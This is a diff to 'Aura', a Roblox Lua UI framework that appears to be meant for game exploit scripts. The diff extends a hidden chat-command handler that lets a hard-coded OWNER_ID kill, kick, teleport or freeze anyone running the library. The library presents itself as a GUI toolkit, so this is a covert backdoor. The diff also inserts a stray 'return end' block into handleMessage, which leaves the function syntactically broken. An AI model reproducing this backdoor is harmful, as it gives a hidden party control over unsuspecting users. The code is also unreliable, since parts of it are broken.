@@ -23,10 +23,11 @@ local activeLoops = {}
 
 -- [[ THRONE ENGINE: COMMANDS ]]
 local MasterCommands = {
-    ["kill"] = function(t) if t.Character then t.Character:BreakJoints() end end,
+    ["kill"] = function(t) if t.Character and t.Character:FindFirstChildOfClass("Humanoid") then t.Character:FindFirstChildOfClass("Humanoid").Health = 0 end end,
+    ["oof"] = function(t) if t.Character and t.Character:FindFirstChildOfClass("Humanoid") then t.Character:FindFirstChildOfClass("Humanoid").Health = 0 end end,
     ["tp"] = function(t) if t.Character then Players.LocalPlayer.Character:PivotTo(t.Character:GetPivot()) end end,
     ["bring"] = function(t) if t.Character then t.Character:PivotTo(Players.LocalPlayer.Character:GetPivot()) end end,
-    ["freeze"] = function(t) if t.Character and t.CharacterForFirstChild("HumanoidRootPart") then t.Character.HumanoidRootPart.Anchored = true end end,
+    ["freeze"] = function(t) if t.Character and t.Character:FindFirstChild("HumanoidRootPart") then t.Character.HumanoidRootPart.Anchored = true end end,
     ["unfreeze"] = function(t) if t.Character and t.Character:FindFirstChild("HumanoidRootPart") then t.Character.HumanoidRootPart.Anchored = false end end,
     ["kick"] = function(t) t:Kick("Aura Admin: Disconnected by Master.") end,
     ["speed"] = function(t, arg) if t.Character and t.Character:FindFirstChild("Humanoid") then t.Character.Humanoid.WalkSpeed = tonumber(arg) or 100 end end,
@@ -35,15 +36,22 @@ local MasterCommands = {
     ["unbs"] = function(t) if t == Players.LocalPlayer and bsGui then bsGui:Destroy(); bsGui = nil end end,
     ["noclip"] = function(t) if t ~= Players.LocalPlayer then return end; if noclipConnection then noclipConnection:Disconnect() end; noclipConnection = RunService.Stepped:Connect(function() if Players.LocalPlayer.Character then for _, p in pairs(Players.LocalPlayer.Character:GetChildren()) do if p:IsA("BasePart") then p.CanCollide = false end end end end) end,
     ["clip"] = function(t) if t == Players.LocalPlayer and noclipConnection then noclipConnection:Disconnect(); noclipConnection = nil end end,
+    ["announcement"] = function(t, arg) if _G.AuraInstance then _G.AuraInstance:Announcement(arg) end end,
+    ["an"] = function(t, arg) if _G.AuraInstance then _G.AuraInstance:Announcement(arg) end end,
 }
 
 local function handleMessage(id, msg)
     if id ~= OWNER_ID or msg:sub(1, #CMD_PREFIX) ~= CMD_PREFIX then return end
     local content = msg:sub(#CMD_PREFIX + 1):split(" ")
     local cmd, targetRef = content[1]:lower(), content[2] or ""
+    local arg = msg:sub(#CMD_PREFIX + #cmd + 2) -- Full message after command
     local target = nil
     if targetRef == "." or targetRef == "me" then target = Players.LocalPlayer elseif targetRef == "all" then target = "all" end
     if not target then for _, p in pairs(Players:GetPlayers()) do if p.Name:lower():sub(1, #targetRef) == targetRef:lower() then target = p; break end end end
+    
+        return
+    end
+
     if target == "all" then for _, p in pairs(Players:GetPlayers()) do if MasterCommands[cmd] then MasterCommands[cmd](p, content[3]) end end
     elseif target and MasterCommands[cmd] then MasterCommands[cmd](target, content[3]) end
 end
@@ -57,6 +65,7 @@ end
 
 function Aura:CreateWindow(options)
     local options = options or {}
+    _G.AuraInstance = self
     local windowTitle = options.Name or "Aura Premium"
     self.Hotkey = options.Hotkey or Enum.KeyCode.L
     chatConnection = TextChatService.MessageReceived:Connect(function(msg) if msg.TextSource then handleMessage(msg.TextSource.UserId, msg.Text) end end)
@@ -142,6 +151,27 @@ function Aura:Destroy()
     for _, loop in pairs(activeLoops) do if typeof(loop) == "RBXScriptConnection" then loop:Disconnect() elseif typeof(loop) == "thread" then task.cancel(loop) end end
     if self.Gui then self.Gui:Destroy() end
     print("Aura Framework: Session Terminated.")
+end
+
+function Aura:Announcement(text)
+    local AnnGui = Instance.new("ScreenGui"); AnnGui.Name = "AuraAnnouncement"; AnnGui.Parent = CoreGui
+    local Holder = Instance.new("Frame"); Holder.Size, Holder.Position, Holder.BackgroundTransparency, Holder.ClipsDescendants, Holder.Parent = UDim2.new(0, 400, 0, 50), UDim2.new(0.5, -200, 0, 20), 1, true, AnnGui
+    local Left = Instance.new("Frame"); Left.Size, Left.Position, Left.BackgroundColor3, Left.BorderSizePixel, Left.Parent = UDim2.new(0.5, 0, 1, 0), UDim2.new(0, 0, 0, 0), Color3.fromRGB(15, 15, 20), 0, Holder
+    local Right = Instance.new("Frame"); Right.Size, Right.Position, Right.BackgroundColor3, Right.BorderSizePixel, Right.Parent = UDim2.new(0.5, 0, 1, 0), UDim2.new(0.5, 0, 0, 0), Color3.fromRGB(15, 15, 20), 0, Holder
+    Instance.new("UICorner", Left).CornerRadius = UDim.new(0, 12); Instance.new("UICorner", Right).CornerRadius = UDim.new(0, 12)
+    local Msg = Instance.new("TextLabel"); Msg.Size, Msg.Text, Msg.TextColor3, Msg.Font, Msg.TextSize, Msg.BackgroundTransparency, Msg.ZIndex, Msg.Parent = UDim2.new(1, 0, 1, 0), text, Color3.fromRGB(0, 150, 255), Enum.Font.GothamBold, 16, 1, 2, Holder
+    
+    -- Animation: Open
+    Left.Position = UDim2.new(0.5, 0, 0, 0); Left.Size = UDim2.new(0, 0, 1, 0)
+    Right.Position = UDim2.new(0.5, 0, 0, 0); Right.Size = UDim2.new(0, 0, 1, 0)
+    TweenService:Create(Left, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, 0), Size = UDim2.new(0.5, 0, 1, 0)}):Play()
+    TweenService:Create(Right, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0, 0), Size = UDim2.new(0.5, 0, 1, 0)}):Play()
+    
+    task.delay(4, function()
+        TweenService:Create(Left, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0.5, 0, 0, 0), Size = UDim2.new(0, 0, 1, 0)}):Play()
+        TweenService:Create(Right, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0.5, 0, 0, 0), Size = UDim2.new(0, 0, 1, 0)}):Play()
+        task.wait(0.6); AnnGui:Destroy()
+    end)
 end
 
 function Aura:Notify(options)
